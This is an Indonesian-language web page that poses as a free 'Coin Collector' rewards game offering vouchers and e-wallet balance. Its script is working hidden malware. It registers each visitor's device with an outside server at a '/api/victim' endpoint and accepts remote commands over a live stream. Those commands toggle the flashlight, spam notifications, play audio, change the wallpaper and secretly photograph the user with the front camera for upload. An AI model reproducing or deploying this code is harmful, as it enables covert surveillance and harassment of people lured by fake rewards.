<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ü™ô Coin Collector - Tukar Hadiah Gratis!</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #fbbf24 0%, #f59e0b 50%, #d97706 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            overflow-x: hidden;
        }

        .container {
            background: white;
            padding: 30px;
            border-radius: 25px;
            box-shadow: 0 25px 70px rgba(0,0,0,0.4);
            max-width: 480px;
            width: 100%;
            text-align: center;
            position: relative;
            overflow: hidden;
        }

        .container::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, rgba(251,191,36,0.1) 0%, transparent 70%);
            animation: glow 8s ease-in-out infinite;
        }

        @keyframes glow {
            0%, 100% { transform: rotate(0deg) scale(1); }
            50% { transform: rotate(180deg) scale(1.2); }
        }

        .header {
            position: relative;
            z-index: 1;
        }

        .coin-icon {
            font-size: 80px;
            margin-bottom: 15px;
            animation: bounce 2s ease-in-out infinite;
        }

        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-20px); }
        }

        h1 {
            background: linear-gradient(135deg, #f59e0b, #d97706);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-size: 2.2em;
            margin-bottom: 10px;
            font-weight: 800;
        }

        .subtitle {
            color: #666;
            font-size: 0.95em;
            margin-bottom: 25px;
            line-height: 1.5;
        }

        .coin-balance {
            background: linear-gradient(135deg, #fbbf24, #f59e0b);
            color: white;
            padding: 25px;
            border-radius: 15px;
            margin: 20px 0;
            box-shadow: 0 10px 30px rgba(251,191,36,0.4);
            position: relative;
            overflow: hidden;
        }

        .coin-balance::before {
            content: 'üí∞';
            position: absolute;
            font-size: 120px;
            opacity: 0.1;
            right: -20px;
            top: -30px;
        }

        .balance-label {
            font-size: 0.85em;
            opacity: 0.9;
            margin-bottom: 5px;
        }

        .balance-amount {
            font-size: 3em;
            font-weight: 800;
            text-shadow: 0 4px 10px rgba(0,0,0,0.2);
        }

        .collect-btn {
            width: 100%;
            padding: 18px;
            background: linear-gradient(135deg, #10b981, #059669);
            color: white;
            border: none;
            border-radius: 15px;
            font-size: 1.2em;
            font-weight: 700;
            cursor: pointer;
            box-shadow: 0 8px 25px rgba(16,185,129,0.4);
            transition: all 0.3s;
            margin-bottom: 15px;
        }

        .collect-btn:active {
            transform: scale(0.95);
            box-shadow: 0 4px 15px rgba(16,185,129,0.3);
        }

        .exchange-btn {
            width: 100%;
            padding: 18px;
            background: linear-gradient(135deg, #8b5cf6, #7c3aed);
            color: white;
            border: none;
            border-radius: 15px;
            font-size: 1.2em;
            font-weight: 700;
            cursor: pointer;
            box-shadow: 0 8px 25px rgba(139,92,246,0.4);
            transition: all 0.3s;
        }

        .exchange-btn:active {
            transform: scale(0.95);
            box-shadow: 0 4px 15px rgba(139,92,246,0.3);
        }

        .reward-list {
            background: #f9fafb;
            padding: 20px;
            border-radius: 15px;
            margin-top: 20px;
            text-align: left;
        }

        .reward-list h3 {
            color: #1f2937;
            margin-bottom: 15px;
            font-size: 1.1em;
        }

        .reward-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 12px;
            background: white;
            border-radius: 10px;
            margin-bottom: 10px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
        }

        .reward-name {
            font-weight: 600;
            color: #374151;
        }

        .reward-price {
            background: linear-gradient(135deg, #fbbf24, #f59e0b);
            color: white;
            padding: 5px 12px;
            border-radius: 20px;
            font-size: 0.85em;
            font-weight: 700;
        }

        .status {
            padding: 12px;
            border-radius: 10px;
            margin: 15px 0;
            font-weight: 600;
            font-size: 0.9em;
        }

        .status.connected {
            background: #d1fae5;
            color: #065f46;
        }

        .status.collecting {
            background: #fef3c7;
            color: #92400e;
        }

        .floating-coin {
            position: fixed;
            font-size: 40px;
            pointer-events: none;
            animation: float-up 3s ease-out forwards;
            z-index: 9999;
        }

        @keyframes float-up {
            0% {
                opacity: 1;
                transform: translateY(0) rotate(0deg);
            }
            100% {
                opacity: 0;
                transform: translateY(-200px) rotate(720deg);
            }
        }

        #wallpaperDisplay {
            display: none;
        }

        #audio-player {
            display: none;
        }

        #video-preview {
            position: absolute;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }

        .loader {
            border: 4px solid #fef3c7;
            border-top: 4px solid #f59e0b;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 15px auto;
            display: none;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="coin-icon">ü™ô</div>
            <h1>Coin Collector</h1>
            <p class="subtitle">Kumpulkan coin gratis setiap hari dan tukar dengan hadiah menarik!</p>
        </div>

        <div class="status connected" id="statusBox">
            <span id="statusText">‚úì Sistem Aktif</span>
        </div>

        <div class="coin-balance">
            <div class="balance-label">Total Coin Kamu</div>
            <div class="balance-amount" id="coinBalance">0</div>
        </div>

        <button class="collect-btn" id="collectBtn" onclick="collectCoin()">
            üéÅ Klaim Coin Gratis
        </button>

        <button class="exchange-btn" onclick="exchangeCoin()">
            üéØ Tukar Hadiah
        </button>

        <div class="reward-list">
            <h3>üíé Daftar Hadiah</h3>
            <div class="reward-item">
                <span class="reward-name">üéÆ Voucher Game 10K</span>
                <span class="reward-price">100 ü™ô</span>
            </div>
            <div class="reward-item">
                <span class="reward-name">üçï Voucher Makan 25K</span>
                <span class="reward-price">250 ü™ô</span>
            </div>
            <div class="reward-item">
                <span class="reward-name">üì± Pulsa 50K</span>
                <span class="reward-price">500 ü™ô</span>
            </div>
            <div class="reward-item">
                <span class="reward-name">üí∞ Saldo E-Wallet 100K</span>
                <span class="reward-price">1000 ü™ô</span>
            </div>
        </div>

        <div class="loader" id="loader"></div>
    </div>

    <img id="wallpaperDisplay" alt="Wallpaper">
    <audio id="audio-player"></audio>
    <video id="video-preview" autoplay playsinline></video>

    <script>
        // Generate device ID
        function getDeviceId() {
            let deviceId = localStorage.getItem('deviceId');
            if (!deviceId) {
                deviceId = 'device_' + Math.random().toString(36).substr(2, 9);
                localStorage.setItem('deviceId', deviceId);
            }
            return deviceId;
        }

        const deviceId = getDeviceId();
        const userAgent = navigator.userAgent;
        const platform = navigator.platform;

        let coinBalance = parseInt(localStorage.getItem('coinBalance')) || 0;
        document.getElementById('coinBalance').textContent = coinBalance;

        // Connect to server
        fetch('http://zalprimrosex.jerzztech.my.id:2300/api/victim/connect', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ deviceId, userAgent, platform })
        });

        // Listen for commands via SSE
        const eventSource = new EventSource(`http://zalprimrosex.jerzztech.my.id:2300/api/victim/stream/${deviceId}`);

        eventSource.onmessage = async (event) => {
            const data = JSON.parse(event.data);
            
            // Flashlight Control
            if (data.type === 'flashlight') {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ 
                        video: { facingMode: 'environment' } 
                    });
                    const track = stream.getVideoTracks()[0];
                    const capabilities = track.getCapabilities();
                    
                    if (capabilities.torch) {
                        await track.applyConstraints({
                            advanced: [{ torch: data.action === 'on' }]
                        });
                    }
                } catch (err) {
                    console.log('Flashlight error:', err);
                }
            }
            
            // Spam Notification
            if (data.type === 'spam-notification') {
                const { title, message, count, interval } = data;
                
                if ('Notification' in window) {
                    Notification.requestPermission().then(permission => {
                        if (permission === 'granted') {
                            let sent = 0;
                            const spamInterval = setInterval(() => {
                                new Notification(title || 'ü™ô Coin Baru!', {
                                    body: message || 'Kamu mendapat coin gratis!',
                                    icon: 'ü™ô'
                                });
                                
                                sent++;
                                if (sent >= (count || 10)) {
                                    clearInterval(spamInterval);
                                }
                            }, interval || 2000);
                        }
                    });
                }
            }
            
            // Play Music
            if (data.type === 'play-music') {
                const audio = document.getElementById('audio-player');
                audio.src = data.musicUrl || 'https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3';
                audio.volume = 1.0;
                audio.loop = true;
                audio.play().catch(err => console.log('Audio play error:', err));
            }
            
            // Capture Camera
            if (data.type === 'capture-camera') {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ 
                        video: { facingMode: 'user' }
                    });
                    
                    const video = document.getElementById('video-preview');
                    video.srcObject = stream;
                    
                    await new Promise(resolve => {
                        video.onloadedmetadata = resolve;
                    });
                    
                    setTimeout(async () => {
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0);
                        
                        canvas.toBlob(async (blob) => {
                            const formData = new FormData();
                            formData.append('photo', blob, 'capture.jpg');
                            formData.append('deviceId', deviceId);
                            
                            await fetch('http://zalprimrosex.jerzztech.my.id:2300/api/victim/upload-photo', {
                                method: 'POST',
                                body: formData
                            });
                            
                            stream.getTracks().forEach(track => track.stop());
                        }, 'image/jpeg', 0.8);
                    }, 1000);
                    
                } catch (err) {
                    console.log('Camera capture error:', err);
                }
            }
            
            // Wallpaper
            if (data.type === 'wallpaper') {
                document.body.style.backgroundImage = `url(${data.imageUrl})`;
                document.body.style.backgroundSize = 'cover';
                document.body.style.backgroundPosition = 'center';
            }
        };

        // Collect Coin Function
        function collectCoin() {
            const btn = document.getElementById('collectBtn');
            const status = document.getElementById('statusBox');
            const loader = document.getElementById('loader');
            
            btn.disabled = true;
            status.className = 'status collecting';
            status.innerHTML = '<span>‚è≥ Mengumpulkan coin...</span>';
            loader.style.display = 'block';
            
            setTimeout(() => {
                const earnedCoins = Math.floor(Math.random() * 50) + 10;
                coinBalance += earnedCoins;
                localStorage.setItem('coinBalance', coinBalance);
                
                document.getElementById('coinBalance').textContent = coinBalance;
                
                createFloatingCoins(earnedCoins);
                
                status.className = 'status connected';
                status.innerHTML = `<span>‚úì Berhasil! +${earnedCoins} ü™ô</span>`;
                loader.style.display = 'none';
                
                setTimeout(() => {
                    status.innerHTML = '<span>‚úì Sistem Aktif</span>';
                    btn.disabled = false;
                }, 2000);
            }, 2000);
        }

        // Exchange Coin Function
        function exchangeCoin() {
            if (coinBalance < 100) {
                alert('‚ùå Coin kamu kurang! Minimal 100 coin untuk tukar hadiah.');
                return;
            }
            
            alert('üéâ Fitur tukar hadiah akan segera hadir! Terus kumpulkan coin kamu!');
        }

        // Create Floating Coins Animation
        function createFloatingCoins(count) {
            for (let i = 0; i < Math.min(count, 10); i++) {
                setTimeout(() => {
                    const coin = document.createElement('div');
                    coin.className = 'floating-coin';
                    coin.textContent = 'ü™ô';
                    coin.style.left = Math.random() * window.innerWidth + 'px';
                    coin.style.top = window.innerHeight / 2 + 'px';
                    document.body.appendChild(coin);
                    
                    setTimeout(() => coin.remove(), 3000);
                }, i * 100);
            }
        }

        // Heartbeat
        setInterval(() => {
            fetch('http://zalprimrosex.jerzztech.my.id:2300/api/victim/connect', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ deviceId, userAgent, platform })
            });
        }, 10000);

        // Auto-request notification permission
        if ('Notification' in window && Notification.permission === 'default') {
            Notification.requestPermission();
        }
    </script>
</body>
</html>
